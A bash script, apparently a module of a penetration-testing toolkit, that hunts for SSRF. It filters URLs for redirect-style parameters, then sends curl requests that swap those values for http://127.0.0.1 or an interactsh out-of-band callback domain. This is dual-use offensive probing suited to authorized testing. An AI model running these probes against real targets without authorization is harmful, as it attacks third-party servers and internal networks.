#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  vuln_ssrf.sh — SSRF Hunting                                ║
# ║  Parameter extraction + SSRF probing                        ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="vuln_ssrf.sh"
SCRIPT_DESC="SSRF Vulnerability Scanning"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Hunt for Server-Side Request Forgery vulnerabilities."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  -u, --urls FILE        File with URLs"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "SSRF" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${URLS_FILE:-}" ]; then
    err "Provide --domain or --urls"
    script_usage
    exit 1
fi

> "${OUT_DIR}/ssrf_findings.txt"

# ── SSRF parameter extraction + probing ──
# Prefer parameterized URLs over base URL list for parameter scanning
if [ -s "${OUT_DIR}/parameterized_urls.txt" ]; then
    urls_input="${OUT_DIR}/parameterized_urls.txt"
elif [ -s "${OUT_DIR}/all_urls.txt" ]; then
    urls_input="${OUT_DIR}/all_urls.txt"
else
    urls_input="${URLS_FILE:-}"
fi
if [ -n "${urls_input:-}" ] && [ -f "$urls_input" ]; then
    info "Checking for SSRF-prone parameters..."

    # Common SSRF parameter names
    grep -iP '(url=|uri=|path=|dest=|redirect=|next=|data=|reference=|site=|html=|val=|validate=|domain=|callback=|return=|page=|feed=|host=|port=|to=|out=|view=|dir=|show=|navigation=|open=|file=|document=|folder=|pg=|style=|pdf=|template=|php_path=|doc=)' \
        "$urls_input" 2>/dev/null | sort -u > "${OUT_DIR}/ssrf_candidates.txt" || true

    candidate_count=$(count_lines "${OUT_DIR}/ssrf_candidates.txt")
    if [ "$candidate_count" -gt 0 ]; then
        log "SSRF candidate URLs: ${candidate_count}"

        # Quick SSRF probe — internal IP canary
        info "Probing top SSRF candidates (internal IP canary)..."
        head -20 "${OUT_DIR}/ssrf_candidates.txt" | while IFS= read -r url; do
            test_url=$(echo "$url" | sed -E 's/(url|uri|path|dest|redirect|callback|return|next)=[^&]*/\1=http:\/\/127.0.0.1/')
            status=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$test_url" 2>/dev/null || echo "000")
            if [[ "$status" =~ ^(200|301|302)$ ]]; then
                echo "SSRF_CANDIDATE ${status} ${test_url}" >> "${OUT_DIR}/ssrf_findings.txt"
            fi
        done

        # OOB SSRF probe with interactsh (if available)
        if check_tool interactsh-client 2>/dev/null; then
            info "Starting interactsh for OOB SSRF detection..."
            # Generate interactsh subdomain
            INTERACT_LOG="${OUT_DIR}/interactsh_ssrf.log"
            interactsh-client -json -o "$INTERACT_LOG" &
            INTERACT_PID=$!
            sleep 3

            # Extract the interaction URL from the log
            INTERACT_URL=$(grep -oP '[a-z0-9]+\.[a-z0-9]+\.interactsh\.(com|sh)' "$INTERACT_LOG" 2>/dev/null | head -1)
            if [ -n "$INTERACT_URL" ]; then
                info "OOB SSRF probing with callback: ${INTERACT_URL}"
                head -20 "${OUT_DIR}/ssrf_candidates.txt" | while IFS= read -r url; do
                    test_url=$(echo "$url" | sed -E "s/(url|uri|path|dest|redirect|callback|return|next)=[^&]*/\1=http:\/\/${INTERACT_URL}/")
                    curl -sk -o /dev/null --max-time 5 "$test_url" 2>/dev/null || true
                done
                # Wait for callbacks
                sleep 10
                kill $INTERACT_PID 2>/dev/null || true
                wait $INTERACT_PID 2>/dev/null || true

                # Check for OOB interactions
                oob_hits=$(grep -c '"protocol"' "$INTERACT_LOG" 2>/dev/null || echo 0)
                if [ "$oob_hits" -gt 0 ]; then
                    warn "OOB SSRF CONFIRMED — ${oob_hits} callbacks received!"
                    echo "# OOB SSRF via interactsh (${oob_hits} callbacks)" >> "${OUT_DIR}/ssrf_findings.txt"
                    grep '"protocol"' "$INTERACT_LOG" >> "${OUT_DIR}/ssrf_findings.txt" 2>/dev/null || true
                fi
                log "Interactsh OOB: ${oob_hits} callbacks"
            else
                warn "Could not start interactsh — skipping OOB SSRF"
                kill $INTERACT_PID 2>/dev/null || true
            fi
        fi
    else
        warn "No SSRF-prone parameters found"
    fi
else
    warn "No URL file available for SSRF parameter scanning"
fi

sort -u -o "${OUT_DIR}/ssrf_findings.txt" "${OUT_DIR}/ssrf_findings.txt"
log "Total SSRF findings: $(count_lines "${OUT_DIR}/ssrf_findings.txt")"
log "SSRF results: ${OUT_DIR}/ssrf_findings.txt"
